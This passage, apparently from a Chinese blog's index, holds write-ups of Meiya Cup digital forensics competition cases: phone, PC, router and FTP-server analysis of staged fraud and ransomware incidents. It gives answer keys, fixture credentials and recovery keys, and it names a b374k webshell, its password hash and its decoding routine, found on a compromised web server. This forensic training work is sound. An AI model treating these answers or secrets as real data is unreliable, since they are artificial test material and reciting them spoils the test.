受害人的信用卡CSC号码是甚么（何PCKYI-电子邮件：shy1211@mtzh.gow.tw）\n同上，112\n顺便了解一下啥时CSC\n\n信用卡安全码（英文：Card Security Code）是信用卡在进行网络交易和电话交易时的一个安全特征。它通常是印刷在信用卡上面的3或4位数字，用于证实付款人在交易时是拥有信用卡的，从而防止信用卡欺诈。\n信用卡的有效期(exp)\n填写的格式一般是 月/年 比如说0912 就是有效期到2012年9月\n\n\n除了上述在USB 找出ZIP文件,请找出相同ZIP文件的路径？\nUSB上的ZIP文件如下\n\n而在电脑中Partition 3\\Users\\Alice\\Downloads路径下同样含有Downloads.7z\n\n\nZIP文件的哈希值（SHA-256）是甚么？\n88F68F8755E1F76107D6EE2134ED32BABBC91F0B44C7C0EE3850BBA74B7E59B8\n\nZIP文件的修改时间是多少?(当地时间)\n\n\nUSB驱动器在Alice笔记本计算机上的最后插入时间是何时？(当地时间)\n\n\n解压的ZIP文件内有哪些文件？\n可以看到就是我们已经知道的这几个文件，在访问记录中都能找到（虽然压缩包被加密了\n\n\n“ ZIP文件中发票的哈希值（SHA 256）是多少=发票（1） 名称：WhatsApp Image 2020-09-29 at 18.35.25.jpeg”\n注意别找错了\nF4C391A38AB82AD19EDB2B7402DA31F52006C3B4B018F859A451B839878D3EE4\n\n“ ZIP文件中发票的哈希值（SHA 256）是多少=发票（2） 名称：WhatsApp Image 2020-09-29 at 18.37.47.jpeg”\n2DAFCC2552A7337844B90F0AB5CDA85BF2F5A71A635E0D3B05731C95937D21F5\n\nAlice笔记本计算机上安装了哪种电子邮件软件？\n仿真之后桌面上即可看到\n\n\nAlice笔记本计算机上的电子邮件软件的版本是甚么？\n同上Outlook 2016\n\nAlice笔记本计算机登录电子邮件软件的电子邮件帐户是甚么？\nalicechen741@gmail.com\n\nAlice在上述电子邮件对话中获得了哪些数据/文件？\n\n\n该电子邮件的发信者的电子邮件地址是甚么？\n同上bobcheung123@gmail.com\n\n上述已收的电子邮件, 发件人的IP地址是甚么？\n火眼并没有配置这方面功能，只能手动搞\n\n\n\nhttps://mxtoolbox.com/EmailHeaders.aspx这个网站可以帮助分析\n\n\n在笔记本, Alice的电子邮件地址是甚么？\nalicechen741@gmail.com\n\n除了Alice，还有其他电子邮件地址与该骗局有关吗？\nbobcheung123@gmail.com\n\n哪些人有AP和主脑之间的电子邮件记录？有文件传输吗？\nAlice和Bob 有文件传输（这几道题算是对前面的梳理吧\n\n在ZIP 文件中, 有多少受害人的信用卡数据被盗?\n\n7\n\n已被黑客盗用其信用卡资料购买的受害者是谁?\n这个应该就是体现在那两个账单上了吧，打开看看\n\n\n\n被盗用的内容是甚么？\n姓名 CSC Credit Number  -&gt; C\n\n\n这俩说实话感觉不太能对上\n手提电话的数码法理档案\nAlice的手机型号是甚么？\n\n是G3还是G4捏？\n\n公安照片里对比一下就知道了 G3\n\nAlice手机的操作系统版本是甚么？\n\n\nAlice手机的总储存空间是多少?\n这个公安照片里也有\n\n32GB\n\n在Alice 手机, IMG-20200929-WA0002的创建时间是甚么？(本地时间)\n\n\n在Alice 手机,IMG-20200929-WA0004的创建时间是甚么？(本地时间)\n\n\nIMG-20200929-WA0002和IMG-20200929-WA0004的元数据和相机型号是甚么？\n\n\n在Alice 手机, 预设浏览器浏览历史记录的文件在哪里？\n\n\n储存Chrome浏览历史记录的文件是甚么？\n\n\nAlice手机的Whatsapp ID和账户名称是甚么？\n\n\n与Bob和Cole的最后WhatsApp的时间是甚么？(本地时间)\n在群聊里\n\n\n主脑的名字是甚么？\n群聊可以看出是Bob和Cole\n\nAlice，Bob和Cole之间的WhatsApp群组的ID和名称是甚么?\n\n\n哪一个表，显示了聊天群组“ Big Big Club”的创建时间？(本地时间)\n\n由路径找到一个数据库，导出加载，在chat表，咋都有….\n\n\n\n聊天群组“ Big Big Club”是甚么时候创建的？(本地时间)\n\n\nAlice是否曾经登陆whatsapp网站？如果有的话，她是在何时登入? 所用的是甚么浏览器？ （提示：在移动取证图像上找到结果）(UTC +0)\n浏览器记录里没有能直接找到，提示了在图像上找到结果。首先短信中存在登录验证码\n\n\n\n\nEdge 注意差8小时时差\n\nAlice如何收到这笔钱？钱包地址是甚么？\n注意看聊天记录\n\n\n“Deleted by the sender”的media_wa_type是甚么?\n以为是某个接口，原来是数据库的某个字段\n仔细看群聊有一条被删除消息\n\n时间2020-09-18 10:59:31 -&gt; 转成时间戳然后去数据库里查相应字段1600397971\n\n\nAlice手机的Wifi MAC地址是甚么？\n没找到\n\n\n外置储存装置的数码法理档案\nAlice USB驱动器内的ZIP档案的密码是甚么? (某些字符被刻意用*遮盖)\n\n\n\n\n底下的是对的\n\nAlice USB驱动器内的哪一个程序是用作储存秘密数据?\n里面还有一堆apk，其中有一个Messagesecure.apk，可以用图片来加密信息，USB中刚好还有一张图片。密码的话应该就是电脑贴纸上另外一个G889#h\n\n\n打开秘密讯息的密码是甚么? (某些字符被刻意用*遮盖)\n同上，G889#h\n\nUSB驱动器内，其中一个档案的秘密讯息是甚么? (某些字符被刻意用*遮盖)\nbob iphone pw is 1144\n\n贴在笔记本计算器机上的密码有甚么用途?\n从文件中恢复安全消息\n\nAlice USB驱动器内的档案有甚么种类?\n算是总结? PNG, ZIP, APK, 7Z\n\nAlice USB驱动器的哈希值（SHA-256）是甚么？\n528D94ED83F41C356B0588C2C21ECF563E9D8CA66ED6D97A3D57C26291854DFF\n\n在USB驱动器中找到的ZIP文件（Downloads.7z），它的哈希值（SHA-256）是甚么？\n88F68F8755E1F76107D6EE2134ED32BABBC91F0B44C7C0EE3850BBA74B7E59B8\n\n在Alice的USB内, ZIP文件的最后修改时间是？\n\n\n\n","tags":["电子数据取证"]},{"title":"21年美亚杯电子数据取证竞赛复现","url":"/2022/11/06/21%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E4%B8%AA%E4%BA%BA%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"案情背景\n2021年10月某日早上，本市一个名为“大路建设”的高速公路工地主管发现办公室的计算机被加密并无法开启，其后收到了勒索通知。考虑到高速公路的基建安全，主管决定报警。警方调查人员到达现场取证，发现办公室内有三部个人计算机，通过一个老款路由器接入互联网。\n经调查相关电子证据后，警方怀疑一位本地男子–阿力士与本案有关，并将他拘捕。现在你被委派处理这起案件,请由以下资料分析阿力士在本案中的违法犯罪行为, 并还原事件经过。\n\nOne mobile phone which belonged to the Manager\n[单选题]工地主管电话的微信账号是什么?\n定位至主管的手机，解压，可以看到给了一个手机取证的软件CellebriteReader\n\n香港人用的都是Whatsapp，所以没有找到微信相关的信息\n\n\n[填空题]工地主管的隔空投送装置置编号是什么? (请以英文全大写及阿拉伯数字回答)\n原来指的是airdrop\n\n\n[单选题]工地主管电话的哪一个应用程序有关于经纬度24.490474, 118.110220的纪录?\n在设备位置中\n\n\n[多选题] 工地主管的手提电话中下列哪些数据正确?\nA. iOS 版本为 12.5.4\nB.IMEI为 454120637213361\nC. Apple lD 为 kaiserlee3660@gmail.com\nD.手机曾经安装dropbox 应用程序\n\n\n\n\n\nAC\n\n[填空题]工地主管的电话最常用的浏览器是什么（请以英文全大写回答）\n\n\n\nSAFARI\n\n[单选题] 工地主管的电话连接过哪一个WiFi?\nA. Kaiser Lee\nB.Kaiser\nC. Free Wifi\nD.Kaiser Home\n\n什么是SSID？\n知识点- SSld：无线局域网络（WLAN）名称\n\n[多选题] 工地主管与Alex Chan的Whatsapp 对话中，曾提及以下哪个TeamViewer的用户号码?\nA.435334881\nB.453851521\nC.435475200\nD.456874155\nE.435270306\n\n\n\n\n\nACE\n这个聊天记录md很多看不懂说啥呢，大概是这个人让主管装一下teamviewer并把ID密码告诉他\n\n[填空题]工地主管的WhatsApp中有多少个黑名单的记录?(请以阿拉伯数字回答)\n全局搜索文本”黑名单” “black”并没有出现，因此应该是在WhatsApp的数据库中 ，从聊天记录中去定位\n\n\n0\n\n[多选题] 以下哪个蓝牙装置的Uuid 曾连接过工地主管的手机?\n同样定位至数据库\nA.7F1FE70D-2B15-C245-853D-4196F13CC446\nB.1B057C1D-83D3-99A6-D2B1-EC54846C7CEE\nC.134ACD1-83D3-99A6-D2B1-EC54846C7CEE\nD.7D1BE70D-2C16-D246-851D-491613DD776\n\n\nAB\n\n\n主管的计算机\n取证大师好牛，直接识别到加密分区并支持解密\n\n[填空题]工地主管计算机的E盘的Bitlocker修复密钥标识符是甚么?(请以英文全大写及阿拉伯数字回答，不用输入“-”)\n\n\n\n​    36EBC180-95F7-41FF-BE5B-4E56E7AF48B1\n\n[填空题]工地主管计算机内的FTP程序FileZilla的用户名称是甚么?(请以英文全大写及阿拉伯数字回答)\n\n\n\nALEX\n\n[填空题]工地主管的Team Viewer ID是甚么?(请以英文全大写及阿拉伯数字回答)\n\n参考第七题的聊天记录就知道主管的ID是435270306\n\n[填空题]工地主管的Team Viewer与哪一个ID连接?(请以英文全大写及阿拉伯数字回答\n\n\n420190768\n\n[多选题]工地主管曾用计算机浏览器作搜寻，以下哪一个关键词他曾经搜寻?\nA.tiktok\nB.web whatsapp\nC.facebook\nD.lihkg\nE.hkgolden\nF.web wechat\n\n\n\nBC\n\n[填空题]工地主管计算机的Windows系统的产品标识符是甚么?(请以英文全大写及阿拉伯数字回答，不用输入“-“)\n\n\n\n003311000000001AA962\n\n[填空题]工地主管曾用计算机使用WhatsApp，他曾和以下哪个电话号码沟通?(请以阿拉伯数字回答)\n主管电脑上没搜寻到关于WhatsApp联系人相关的信息，所以先放一放，从被联系人那里找\n\n[多选题]工地主管计算机的用户名称是甚么?其用户标识符是甚么?\nA.用户名称: PC1\nB.用户名称:PC2\nC.用户名称: PC3\nD.用户标识符:0x000003E7\nE.用户标识符:0x000003E8\nF.用户标识符:0x000003E9\n\nps: 用户标识符给的是16进制形式所以需要转换\n\n\n\nA F\n\n[单选题] 工地主管计算机的预设浏览器是甚么?\n仿真一下\n\n在设置-默认app中可以看到预设浏览器的选项\n\n\n[填空频工地主管计算机的其中一个分区被人加密，分区内的电子表格Material3.xlsx的哈希值(SHA1)是甚么?(请以英文全大写及阿拉伯数字回答)\n这题目前也做不了，因为我们需要先将被加密分区进行解密\n尝试在其他设备探索，之前题目有线索关于FTP客户端的信息，那么很有可能中间有文件经过了FTP传输。去FTP服务器上找找\nPS：在第十题中我们已经找到了修复密钥的标识符36EBC180-95F7-41FF-BE5B-4E56E7AF48B1，需要的是恢复密钥的文件，直接在证据文件中搜索\n\n\n打开之后再去搜索Material3.xlsx\n40418B21F6C3E4AF306D5EF3B80A776DA72FC1D2\n\n[多选题]路由器的记录中显示以下有哪些IP是公司的电子器材?\nA.192.168.40.128\nB.192.168.40.129\nC.192.168.40.130\nD.192.168.40.131\nE.192.168.40.132\n\n\n\n\n\n\n132没有找到\nABCD\n\n[填空题]路由器的记录中显示公司的计算机下载了FTP软件，该下载网站的IP是什麼?(请以阿拉伯数字作答，省去”.”符号)\n尝试搜索FTP 没有结果；主管电脑上安装的FTP软件为FileZilla，搜索\n\n49.12.121.47\n还有一个思路是通过HTTPS的端口为443来搜索\n\n[多选题)]路由器的记录中显示公司计算机的资料用FTP软件传到了甚么IP地址及利用端口?\nA.IP地址: 2.2.2*.114\nB.IP地址: 8.8.1*.20\nC.IP地址: 1.1.0*.13\nD.端口: 21\nE.端口: 80\n之前在主管电脑上有FTP的连接记录，ip为218.255.242.114，搜一下\n\n\n\nAD\n\n[多选题] 路由器的记录中显示以下哪些关键词是表示公司计算机与外界网络联机?\nA.destination\nB.ICMP echo request\nC.inside\nD.outside\nE.以上皆是\n参考第21题的文本\nA D\n\n算是网络的基本知识了，outside 表示外网地址，inside 表示内网地址，destination 表示目标地址， ICMP echo request 是 ICMP 回应请求报文（Ping 指令可以产生）。\n\n\n[单选题] 路由器的记录中显示哪一个IP曾以teamviewer 连接公司计算机?\nA. 110.152.0.14\nB.52.152.117.114\nC.180.152.0.13\nD.83.26.80.131\n还是主管的电脑teamviewer连接记录，可以试试定位TeamViewerID 或者开始时间。\n\n发现思路不对，应该从teamviewer端口来查找\n\n\n\n\nB\n\n[多选题]路由器的记录中显示以下哪一个有可能是以teamviewer 遥控公司计算机的时间?\nA.09:31,09:37\nB.0933,09:39\nC.10:29,10:36\nD.10:40\nE.10:42\n从上面就可以定位全部的时间 起始和结束 ACE\n\n[填空题]路由器的记录中显示有多少电子器材有可能曾被入侵?(请以阿拉伯数字作答)\n我们已经知道了入侵是通过teamviewer 所以看看它连接了多少个IP\n\n\n\n\n\n3个\n\n[多选题]阿力士 iPhone12pro电话于2021年10月21日，以下哪张相片可能曾被分享（UTC+8）？\n\nA. IMG_0011HEIC\nB. IMG_0010. HEIC\nC. IMG_0009.HEIC\nD. IMG_0008.HEIC\nE. IMG_0007. HEIC\n知识点盲区了：被分享过的图片会生成不带元数据的缩略图，所以直接在图像里过滤\n\n找到对应的原图\n\nA 话说这不是多选题。。。\n\n[单选题] 阿力士iPhone 12 pro电话中哪一张相片可能曾被修改拍摄时间?\n\nA.IMG_0011.HEIC\nB.IMG_0010.HEIC\nC.IMG_0009.HEIC\nD.IMG_0008.HEIC\n结合上题可知修改了时间并分享， A\n\n[填空题]阿力士iPhone 12 pro的GSM媒体访问控制地址是什么?(请以英文全大写及阿拉伯数字回答，不用输入”.”)\n就是指的本机MAC地址\n手机为蓝牙媒体，所以选蓝牙设备的地址\n\n\n[单选题] 阿力士的iphone 12 pro以什么屏幕密码保护?\nA.6位阿拉伯数字密码\nB.4位阿拉伯数字密码\nC.图形密码\nD.以上皆非\n离谱题，手工查找pslist文件，找到manifest.plist文件中的WasPasscode的值为false，表示没有设置密码锁。\n\n\n[多选题]阿力士iphone 12 pro内以下哪一张相片是实况相片(live Photos)?\nA.IMG_0011.HEIC\nB.IMG_0010.HEIC\nC.IMG_0012.HEIC\nD.IMG_0009.HEIC\n\n\n\n\n\n\nDAB\n\n[单选题]以下哪一个是阿力士iphone 12 pro可能曾经连接的装置名称?\nA.Chris’s MacBook Pro\nB.Chirs’s iPhone\nC.Chirs’s Computer\nD.Chirs’s Linux.\n在联系人中可以找到 A\n\n\n\n\n[多选题] 接上题，记录连接时间是什么时候(UTC+8)?\nA.2021年10月21日 00:58:01\nB.2021年10月21日 08:58:01\nC.2021年10月21日 00:58:29\nD.2021年10月21日 08:58:29\n时间线里也可以看到 B\n\n\n[多选题]阿力士iPhone XR中在软件WhatsApp中工地主管与阿力士的对话中曾提到:[巨叫我俾钱喎，BTC係唔係呢个啊?]，在进行电子数据取证分析后，以下哪一个是有可能关于此对话的正确描述?\n巨叫我给钱㖞，BTC是不是这个啊\nA 此对话被Kariser Lee删除\nB.此对话的附件为一张图片文件\nC.此对话被Alex Chan删除\nD.此对话是引用Alex Chan回复\n\n\n\nAB\n\n[填空题]阿力士iPhone XR的WhatsApp对话中，阿力士曾要求工地主管支付多少个BTC?(请以阿拉伯数字回答)\n10\n\n\n[多选题] 阿力士iPhone XR中MG_0056.HEIC”的图像与”5005.JPG”(MD5:96c48152249536d14eaa80086c92fcb9)看似为同一张相片，在电子数据取证分析下，以下哪样描述是正确?\nA.储存在不同的.db里\nB.有不同哈希值\nC. IMG_0056.HEIC为原图,5005.JPG(MD5:96c48152249536d14eaa80086c92fcb9)为缩略图\nD.IMG 0056.HEIC 曾被开启过，所以在I0S系统中创建了缩略图5005.JPG(MD5:96c48152249536d14eaa80086c92fcb9)\n\n\n\n\n哈希肯定不同 ，通过大小也可以判断出5005为缩略图；D的话应该是推断的吧\nBCD\n\n[多选题]阿力士iPhone XR中相片檔IMG_0056.HEIC提供了什么电子数据取证的信息?\nA此相片是由隔空投送(Airdrop)得来\nB.此相片由iPhone XR拍摄\nC.此相片的拍摄时间为2021-10-21 17:45:48(UTC+8)\nD.此相片的拍摄时间为2021-09-08 17:35:00(UTC+8)\n\n\n\nAC A其实不太确定 因为这台设备的AirDrop ID找不到\n\n[单选题] 阿力士iPhone XR中阿力士的电邮账户Alexc19851016@gmail.com的密码有可能是什么?\nA.Ac19851016\nB.Alex1985!\nC.Aa475869!\nD.以上皆非\n备注里有 C\n\n\n[填空题]阿力士iPhone XR曾经连接Wifi”Alex Home”的密码是什么?(请以英文全大写及阿拉伯数字回答)\n\n\n\n关键词搜索 12345678\n\n[单选题] 阿力士iPhone XR经ICloud备份的最后时间是什么?(UTC+8)?\nA.2021-10-21 17:51:38(UTC+8)\nB.2021-10-21 18:02:13+(UTC+8)\nC.2021-10-21 09:51:38(UTC+8)\nD.2021-10-21 10:02:13+(UTC+8)\n\n\n\n​    C\n\n[填空题]阿力士IPhone XR中的iBoot版本是iBoot-____?(请以阿拉伯数字回答，不用轮入”.”)\niboot苹果路径：Lockdown service/phoneInfo.xml\n\niBoot-6723.120.36\n\n[多选题]阿力士IPhone XR中的WhatsApp群组【团购-新鲜猪肉牛肉-东涌群组-9/30】有以下哪一个成员?\nA. 85260617332@s.whatsapp.net\nB. 85260452579@s.whatsapp.net\nC. 85248791565@s.whatsapp.net\nD. 85264630956@s.whatsapp.net\n定位数据库太慢了，选择题直接搜吧\n\n\n\nAD\nAlex的电脑\n\n\n[单选题]阿力士的计算机显示曾于hongkongcard.com的论坛登记成为会员，以下哪个是他的帐户密码?\nA.Aa475869!\nB.Bb475869!\nC.Cd475869!\nD.以上皆非\n在浏览器登录信息中可以找到登录名称\n\n结合38题的note\n\nA\n\n[单选]阿力士的计算机显示阿力士曾用什么方法进入受害者(主管)的计算机?\nA.远程操控\nB.特洛伊木马程序\nC.勒索软件\nD.恶意软件\n结合13题，利用teamviewer远程连接 A\n\n单选题] 续上题，阿力士最后一次进入受害者(主管)计算机的时间是什么?\nA.于2021年10月18日 10时36分\nB.于2021年10月18日18时36分\nC.于2021年10月18日6时53分\nD.于2021年10月18日18时42分\n\n\n\nD\n\n[填空题]阿力士的计算机显示他曾经使用FTP程序，FTP的主机IP地址是什麼?(请以亚拉伯数字作答，省去”.”符号)\n\n218.255.242.114  这个和路由器连接的FTP记录相照应\n\n[填空题]阿力士的计算机显示于2021年9月至2021年11月期间，计算机曾被登入过多少次?(请以阿拉伯数字回答)\n\n\n\n解题思路：这种一般是跟系统痕迹相关。 共28次\n\n[填空题]阿力士计算机所安装的Microsoft Office 2007 是以下哪一个版本?(请以亚拉伯数字作答，省去”.”符号)\n仿真直接看\n\n\n\n\n12.0.4518.1014\n\n[填空题]以下是阿力士计算机中的Basic data partition (EFI 3) 的Volume ID?(请以英文全大写及阿拉伯数字回答)\n如果利用xways的话路径如下 3\\System Volume Information\\SPP\\OnlineMetadataCache\n\n\n\n{9705c469-7dca-4d55-ae76-7481b9f1428e}\n\n[填空题]阿力士计算机的Window product ID是什么?(请以英文全大写及阿拉伯数字回答，不用输入”-”)\n\n00331-10000-00001-AA411\n\n[单选题]阿力士计算机曾经下载一张猴子的图片，以下哪一项描述正确?\nA.该图片是由”https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSgn6ABvcqTfFPjclbjc9hdx1H4P1QsAuVyTQ&amp;usqp=CAU”下载的\nB.该图片经过加密\nC.该图片于2021-09-30下载\nD.该图片是由GIF档转换成PNG檔\n针对A，浏览器下载记录看下，有一条比较可疑，对应位置看下\n\n\n\n\n针对C 应该是29日\n\nA\n\n[填空题] 阿力士计算机所安装的Microsoft Office 2007 的密钥是甚么?(请以英文全大写及阿拉伯数字回答，不用输入”-”)\n\n\nV77WQ-RPVP6-7MTPG-WH3G9-D44MJ\n\n[单选题] 阿力士FTP服务器用户使用命令行安装了甚么程序?\n\n\n\nA.Docker\nB.Chrome\nC.FileZilla\nD.TeamViewer\nA\n\n[多选题]以下哪些档案于阿力士FTP 服务器曾重复出现?\n\nA.Material1\nB.Material2\nC.Material3\nD.Staff1\nE.Staff2\nF.Staft3\n\n看路径可以知道在docker内部\nDEF\n\n[填空题]在阿力士FTP服务器中，文件夹___曾被用户变更了访问权限(请以英文全大写及阿拉伯数字回答)\n看历史记录即可知道 Dangerous_Project\n\n\n[填空题]在阿力士FTP 服务器建设后，有___个额外用户被加入 (请以阿拉伯数字回答)\n\n\n\n额外用户 可疑看到有一个 wai\n\n[单选题]根据阿力士FTP服务器设定显示，此服务器是以___方式连接网络，且是一个__网络状态\nA.无线，公开\nB.无线，私人\nC.有线，公开\nD.有线，私人\n\n\n\nIP地址是公开的 因此有线 公开 C\n\n[填空题]阿力士FTP 服务器设定最多使用者数目是_50__(请以阿拉伯数字回答)\n需要看配置文件 ftpd.conf\n \n\n[填空题]阿力士FTP服务器使用Docker安装了一个FTP程序为____。(例如 space docker/1.1，请输入spacedocker/1.1，不要输入空格)\n回看历史记录\n\nstilliard/pure-ftpd\n\n[多选题] 阿力士FTP 服务器曾使用过甚么版本的Linux内核?\nA. linux-headers-5.11.0-16\nB.linux-headers-5.11.0-17\nC.linux-headers-5.11.0-36\nD.linux-headers-5.11.0-37\nE.linux-headers-5.11.0-40\n直接搜吧 关键词 linux-headers\n\nAD\n\n[多选题]阿力士FTP 服务器的磁盘分区，有以下哪一种文件系统?\nA.FAT16\nB.FAT32\nC.ExFAT\nD.HFS+\nE.Ext4\n\n\nBE\n\n[填空题]阿力士FTP服务器用户输入了指令___去检查现存的Docker容器(例 netstat lntp,清输入netstatlntp,不能输入空格)\ndocker container ps -a\n\n\n","tags":["电子数据取证"]},{"title":"21年美亚杯电子数据取证团队赛复现","url":"/2022/11/11/21%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E4%BD%93%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"案情背景\n几天后，“大路建设”旗下有一家名为“元材原料”的材料供应子公司，该公司发现几名员工的个人财务资料在网上遭公开发布。为了员工安全，主管决定报警求助。经警方调查发现黑客入侵的手法与“大路建设”的案件十分相似，因此引起调查人员怀疑两起案件有所关联。\n经调查后，警方拘捕了“常威”和“特普”两名本地男子，怀疑他们与本案有关。警方在搜查他们的住宅及公司后，扣押了数台数码设备，请分析以下电子数据并重建电子数据痕迹，以确认“常威”和“特普”在本案中是否有违法犯罪，并还原事件经过。\n\n\n[填空题]工地职员A计算机的修复密钥标识符是什么？(请以大写英文及阿拉伯数字输入答案，不要输入”-“)(1分)[填空题]\n\n\n230C1BB3-106A-4E4E-BF5D-3D10961585D4\n\n[填空题]工地职员A计算机的修复密钥解除锁定是什么？(请以数字输入答案，不要输入”-“)(1分)[填空题]\n资格赛中我们看到了Alex的FTP服务器上是存在BitLocker文件的，其中文件夹3是职员A的\n\n483714-461582-060962-373351-019646-502348-309628-684431\n\n[单选题]工地职员A的计算机被什么程式加密？(1分)\nA.Ransomware\nB.BitLocker\nC.AxCrypt\nD.PGP\nE.FileVault2\nB\n\n[单选题]工地职员A的孩子有可能正准备就读什么学校？(2分)\nA.小学\nB.中学\nC.幼儿园\nD.大学\n\n历史记录可以看到应该是幼儿园 C\n\n[多选题]工地职员A并没有打开过哪一个档案？(2分)\nA.Staff3.xlsx\nB.Staff4.xlsx\nC.Staff1.xlsx\nD.Staff2.xlsx\nE.BTCaddress.bmp\n在访问痕迹和时间轴中关于Staff的只有1，然后BTC也出现过，所以ABD\n\n\n[填空题]工地职员A的计算机被远程控制了多少分钟？(请以阿拉伯数字回答)(2分)[填空题]\n由资格赛我们已经知道了是由teamViewer控制的，看下连接时间 11分钟\n\n\n[单选题]工地职员A的计算机被加密后，被要求存入的虚疑货币是什么？(1分)\nA.比特币现金\nB.比特币\nC.以太币\nD.泰达币\n\n就是B\n\n[填空题]在工地职员A的计算机曾经打开过的Excel档案中，有多少人有可能在法律部门工作？(请以阿拉伯数字回答)(1分)[填空题]\n指的是Staff1.xlsx，筛选出是Legal的，共22个\n\n\n[多选题]工地职员B的计算机在什么日期和时间被黑客控制？(2分)\nA.2021-10-19\nB.2021-09-16\nC.11:16:41(UTC+8:00)\nD.05:55:50(UTC+8:00)\nE.18:40:06(UTC+8:00)\n日期上好像不太对？ E\n\n\n[填空题]工地职员B的计算机的MACAddress是什么?(请以大写英文及数字输入答案)(1分)[填空题]\n\n\n\n00-0C-29-E2-53-2D\n\n[填空题]工地职员B的计算机用户FaFa的ProfileID是什么？(请以大写英文及数字输入答案，不要输入”-“)(1分)[填空题]\n指的是产品ID \n\n\n[填空题]工地职员B的办公室计算机的WindowsCDKey是什么？(请以大写英文及数字输入答案，不要输入”-“)(1分)[填空题]\n指的是Windows 的产品密钥。注册表里应该有，不过需要仿真\nhttps://zhuanlan.zhihu.com/p/43777660\n注册表的位置 C:\\Windows\\System32\\config SOFTWARE 和 SYSTEM\n利用取证大师进行解析\n然后定位路径 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion找到SoftwareProtectionPlatform找到BackupProductKeyDefault\n\n\n[单选题]检查过工地职员B的计算机登录档后(WindowRegistry)，计算机感染了什么恶意软件？(2分)\nA.Adware\nB.Worms\nC.Rootkits\nD.没有感染任何恶意软件\n仿真或者直接用杀毒软件扫一下？感觉很费时间\n\n[单选题]工地职员B的计算机中被加密硬盘内的图片”_120778782_58759559.jpg”，有可能是从下列哪个的途径载入计算机？(1分)\nA.电邮下载附件\nB.USB盘\nC.网上下载\nD.蓝芽传入\nE.Direct-link\nC 浏览器下载记录中有\n\n\n[多选题]工地职员B的计算机中被加密硬盘内的图片中，人物中衣着有什么颜色？(2分)\nA.黄色\nB.红色\nC.紫色\nD.蓝色\nE.绿色\n打开图片辨识一下即可，一眼鱿鱼游戏hhh。 BE\n\n\n[填空题]工地职员B的计算机有多少个磁盘分区？(请以阿拉伯数字输入答案)(1分)[填空题]\n5个\n\n\n[填空题]工地职员B的计算机硬盘分割表是什么？(答案请以首字母大写作答)(2分)[填空题]\n指的是硬盘分区类型XWAYS直接看 GPT\n\n[填空题]在工地职员B的计算机EventLog中最后登入时services.exe的ProcessID是什么？(请以阿拉伯数字输入)(3分)[填空题]\n在日志分析-安全-登录分析中可以看到\n\n\n\nhttps://www.cnblogs.com/xiaozi/p/14263955.html 日志识别分析\nhttps://blog.csdn.net/zhulinu/article/details/52747984\n这两条对应进程ID和进程名，也就是636\n\n\n[填空题]甚么IP曾经上传档案到网页服务器?(请以阿拉伯数字回答，不用输入”.“)(2分)[填空题]\n看日志，先看服务器中间件是啥\n有个xampp快捷搭建网站的软件，里面存在apache中间件\n\napache常见路径：/var/log/apache/access.log /var/log/apache2/access.log /etc/httpd/logs/access_log\n上传文件定位POST请求，关键词upload\n\n为了确认，看下这个uploader.php\n这个网站在单独的目录/xampp/htdocs/www.yuenchoi.com.hk/，\n\n可以看到文件会上传到C:/xampp/htdocs/www.yuenchoi.com.hk/目录下\n\n定位这个Ip 203.145.94.120\n\n[多选题]承上题，以下哪试档案曾被上传到网页服务器?(3分)\nA.kjk2.jpg\nB.kjk2.php\nC.b6778k-9.0.php\nD.b374k-2.5.php\nE.d374k-2.5.php\n\n\n\n\n\n其中C 虽然在目录下存在，但是日志没出现过，可能没有\n很明显测试了一下文件上传后缀 ABD\n或者直接看当前目录下的jpg和php文件\n\n\n[单选题]入侵者可能使用甚么漏洞进行入侵网页服务器?(1分)\nA.文件上传漏洞\nB.SQL注入\nC.跨站脚本攻击\nD.格式化字符串弱点\nA\n\n[多选题]在网页服务器找到的所有文件档(doc及docx)中，有以下哪些文件制作人(Author)?(2分)\nA.KevinL.Brown\nB.PeterR.Lee\nC.Mary\nD.May\nE.Colin\n\n\nAC\n\n[多选题]在网页服务器中，哪个是可疑档案?它如何取得计算机控制权?(3分)\nA.可疑档案:b6778k-9.0.php\nB.可疑档案:b374k-2.5.php\nC.可疑档案:upload.php\nD.透过浏览器远程管理取得计算机控制权,\nE:透过PuTTY(远程登录工具)取得计算机控制权\n文件上传合理怀疑webshell，看一下上传文件的内容\nB 一个木马 因此D\n\n\n[填空题]在网页服务器中，运行可疑档案需要密码，其密码的哈希值(HashValue)是甚么?(请以英文全大写及阿拉伯数字回答)(3分)[填空题]\n密码经过了md5哈希，0de664ecd2be02cdd54234a0d1229b43\n\n\n[单选题]    在网页服务器中，可疑档案的译码函数是甚么?(2分)\nA.unzip_file(‘$x,$y’)\nB.gzdecode(base64_decode($x))\nC.gzinflate(base64_decode($x))\nD.以上皆否\n\n\n简单的字符串拼接，C\n\n[填空题]解压后的脚本档的档案大小是多少?(请以字节及阿拉伯数字回答)(3分)[填空题]\n直接跑一下输出并存到文件中去\n\n\n\n\n这解压出来都不一样啊也，官方wp是用的自己的取证小程序\n\n[多选题]    解压后的脚本文件内有甚么功能?(3分)\nA.编辑文件\nB.删除文件\nC.更改用户密码\nD.加密文件\nE.重新命名文件两个思路，要么直接github搜一下这个脚本\n可以 ABE\n\n要么自己本地跑一下看看\n\n\n[单选题]    解压后的脚本含有压缩功能，当中使用的解压方法是甚么?(2分)\nA.PclZip.php\nB.Unzip_gz()\nC.ZipArchive()\nD.以上皆否\n全局搜索关键词即可 C\n\n\n[多选题]特普的电话中一张于2021年09月30日10:45:12拍摄的相片包含以下哪些字?(1分)\nA.精忠\nB.报国\nC.忠诚\nD.勇毅\n图片太多了，按照时间线来找吧\n\n\n\n扫个码，忠诚勇毅 CD\n\n[多选题]特普的电话中的whatsapp账号85268421495@s.whatsapp.net中，有哪些其他人的WhatsApp用户数据记录?)(2分)\nA.85222117188@s.whatsapp.net\nB.85289853825@s.whatsapp.net\nC.85264795287@s.whatsapp.net\nD.85231882226@s.whatsapp.net\n在联系人中定位数据库\n\n\n\n在wa_contacts表 AD\n\n\n[单选题]特普电话的热点分享密码是什么?(1分)\nA.12345678\nB.69447401bceb\nC.Jioijo4542554\nD.DakPouHome\nB\n\n\n[多选题]特普于经纬度22.278843,114.165783，没有做什么?(2分)\nA.拍影片\nB.拍照\nC.使用googlemap\nD.在Whatsapp中分享实时位置\n就拍了个照片 